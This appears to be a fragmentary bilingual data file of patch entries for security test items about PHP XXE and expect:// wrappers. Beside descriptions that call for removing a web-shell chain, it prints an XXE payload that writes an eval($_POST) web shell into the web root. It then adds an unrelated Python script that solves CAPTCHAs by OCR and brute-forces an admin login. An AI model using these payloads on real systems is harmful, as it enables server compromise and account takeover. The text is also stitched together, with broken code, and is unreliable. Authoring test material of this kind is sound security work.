title.zh: PHP expect 包装器前提验证
title.en: PHP Expect-Wrapper Prerequisite Validation

description.zh: 保留 expect:// 外部实体形式，但只在安装并启用 expect 扩展的隔离 PHP 夹具中输出固定标记；外部实体解析本身不能证明命令执行。
description.en: Retain the expect:// external-entity form but emit only a fixed marker in an isolated PHP fixture with the expect extension installed and enabled; external-entity parsing alone does not prove command execution.

patches.expectedCommand:
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://echo '<?php eval($_POST[cmd]);?>' > /var/www/html/shell.php">
]>
<foo>&xxe;</foo>

title.zh: XXE 与文件写入边界分离
title.en: Separate XXE from File-Write Impact

description.zh: 删除写入 WebShell 的混合链，只保留授权实验中的第二个固定 expect 标记；文件写入、Web 根目录权限和代码执行属于独立影响条件。
description.en: Remove the mixed web-shell write chain and retain a second fixed expect marker for an authorized lab. File writes, web-root permissions, and code execution are independent impact conditions.

description.en: Replace the generalized claim that Base64 bypasses command filtering with a reproducible URI-encoding variant, requiring both expect-extension logs and the fixed marker in an authorized fixture.

import ddddocr
import requests
ocr = ddddocr.DdddOcr()
def solve_captcha(target):
resp = requests.get(f"https://{target}/captcha/image")
code = ocr.classification(resp.content)
return code
for pwd in passwords:
captcha = solve_captcha("{TARGET}")
r = requests.post(f"https://{TARGET}/api/login",
json={"user":"admin","pass":pwd,"captcha":captcha})
if "success" in r.text:
print(f"[+] Password: {pwd}")
